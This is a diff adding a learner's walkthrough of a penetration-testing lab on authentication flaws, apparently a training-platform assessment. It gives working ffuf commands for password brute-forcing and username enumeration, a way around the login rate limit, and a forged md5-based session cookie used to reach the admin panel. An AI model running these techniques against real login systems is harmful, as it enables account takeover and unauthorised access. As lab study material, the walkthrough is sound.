@@ -725,4 +725,109 @@ Session security should also cover multiple logins for the same user and concurr
 
 ## Skill Assessment
 
+During our penetration test, we come across yet another web application. While the rest of the team keeps scanning the internal network for vulnerabilities in an attempt to gain an initial foothold, you are tasked with examining this web application for authentication vulnerabilities.
 
+Find the vulnerabilities and submit the final flag using the skills we covered in the module sections to complete this module.
+
+From past penetration tests, we know that the rockyou.txt wordlist has proven effective for cracking passwords.
+
+The only question in this section is:
+Assess the web application and use various techniques to escalate to a privileged user and find a flag in the admin panel. Submit the contents of the flag as your answer. 
+
+From the create account page we can determine that the Password must start with a capital letter, must end with a digit, must have at least one of $ # @, and it must be a minimum of 20 characters and cannot be more than 29 characters.
+
+Alongside this, it looks like admin is a "banned" prefix. So I might be able to login just using that information.
+
+Looking the post request for login I see the data looks like:
+{
+	"userid": "admin",
+	"passwd": "test",
+	"submit": "submit"
+}
+
+So we might be able to fuzz using ffuf.
+
+First lets make a password list using rockyou.txt that only fits the conditions we specified.
+
+`grep "^[A-Z]" rockyou.txt | grep '[[:lower:]]' | grep -e '@' -e '$' -e '#' |  grep -E '^.{20,29}$' | grep "[@\$#]"`
+
+This returns 693 possible passwords. So lets try that on the admin login.
+
+`ffuf -w passwordsShortlist.txt:FUZZ -u 'http://83.136.254.223:52404/login.php' -d 'userid=admin&passwd=FUZZ&submit=submit' -X POST -H 'Content-Type: application/x-www-form-urlencoded'`
+
+That didn't work, so I tried with the username shortlist:
+`ffuf -w passwordsShortlist.txt:FUZZ,/Users/noneya/Useful/SecLists/Usernames/top-usernames-shortlist.txt:FUZZNAME -u 'http://83.136.254.223:52404/login.php' -d 'userid=FUZZNAME&passwd=FUZZ&submit=submit' -X POST -H 'Content-Type: application/x-www-form-urlencoded' -mc 200 -fs 1807,1825`
+
+Also nothing.
+
+Doesn't seem there is any obvious information being displayed on the password reset link. Just the session ID cookie...
+
+However that cookie is URL encoded and appears to be base64. Lets decode.
+
+084e0343a0486ff05530df6c705c8bb4
+
+Looks like hex... hmm but the result isn't worth much...
+NC?Ho?U0?lp\??
+
+Maybe I should use that Magic on CyberChef. It just seems like worthless numbers.
+
+If I try to create an account with test as the user again I get invalid username... maybe I can fuzz for a valid user that way.
+
+The submit data here looks like: 
+userid=test&email=test%40email.com&passwd1=Aaaaaaaaaaaaaaaaaaaa%402&passwd2=Aaaaaaaaaaaaaaaaaaaa%402&submit=submit
+
+So lets try:
+`ffuf -w /Users/noneya/Useful/SecLists/Usernames/top-usernames-shortlist.txt:FUZZNAME -u 'http://94.237.56.188:37996/register.php' -d 'userid=FUZZNAME&email=test%40email.com&passwd1=Aaaaaaaaaaaaaaaaaaaa%402&passwd2=Aaaaaaaaaaaaaaaaaaaa%402&&submit=submit' -X POST -H 'Content-Type: application/x-www-form-urlencoded' -mc 200`
+
+Interestingly both test and guest return the same size... maybe guest is a user?
+
+Try:
+`ffuf -w passwordsShortlist.txt:FUZZ -u 'http://94.237.56.188:37996/login.php' -d 'userid=guest&passwd=FUZZ&submit=submit' -X POST -H 'Content-Type: application/x-www-form-urlencoded'`
+
+Doesn't seem like it.
+
+When I log I a button that says send a message to another user. And when I try admin it fails saying user not found. Maybe this is where I enumerate.
+
+Resetting the box and logging in again, I pass that request to the send messages again with the same user list.
+
+Hmm guest does exist. So maybe I have wrong list of passwords...
+
+Lets create a new set:
+`grep "^[A-Z]" rockyou.txt | grep '[[:lower:]]' |  grep -E '^.{20,29}$'`
+
+Trying again:
+`ffuf -w passwordsShortlist.txt:FUZZ -u 'http://83.136.252.32:47603/login.php' -d 'userid=guest&passwd=FUZZ&submit=submit' -X POST -H 'Content-Type: application/x-www-form-urlencoded'`
+
+Nope...
+
+So reading some hints, they point me to the support page, which says they have unified their accounts into one account support. When I try to send a message to support it works... Maybe I can sign in with that.
+
+`ffuf -w passwordsShortlist.txt:FUZZ -u 'http://83.136.252.32:47603/login.php' -d 'userid=support&passwd=FUZZ&submit=submit' -X POST -H 'Content-Type: application/x-www-form-urlencoded'`
+
+Nope...
+
+`ffuf -w passwordsShortlist.txt:FUZZ -u 'http://83.136.252.32:47603/login.php' -d 'userid=support.us&passwd=FUZZ&submit=submit' -X POST -H 'Content-Type: application/x-www-form-urlencoded'`
+
+I'm pretty certain this is the grep I need:
+`grep "^[A-Z]" rockyou.txt | grep -E '^.{20,29}$' | grep '[0-9]$' | grep '[[:lower:]]' | grep '[#$@]'`
+
+So I think the issue is that I am not rate limiting. Too many failed attempts make me wait 27 seconds.
+
+Lets try:
+`ffuf -w passwordsShortlist.txt:FUZZ -u 'http://94.237.63.83:47837/login.php' -d 'userid=support.us&passwd=FUZZ&submit=submit' -X POST -H 'Content-Type: application/x-www-form-urlencoded' -rate 1`
+
+Still too fast. Lets write a quick python script that waits 30 seconds after 5 attempts before going again.
+
+I wrote the script and got a valid password. One issue I had was the password was being passed in with the newline character. So I had to remove that and I started getting access.
+
+I found a cookie that needs to be tampered with. When I send it threw Magic in CyberChef I get:
+b3b8b5cf421d3f96f6469fa618a6bb7f:434990c8a25d2be94863561ae98bd682
+
+When we look at the two sides of the : we can tell this appears to be an md5 hash. So we can try to recreate this cookie the same way. After trying a couple of things we discover the cookie is formatted like:
+`support.it:support`
+
+So now we need to write a python function to test other potential roles.
+I spent all the effort of writing a python script to test for the role and got the response for the first role I attempted.
+admin.us:admin
+
+I tried this manually in Burp and it failed, so I am not sure how it worked in Python. But it did.
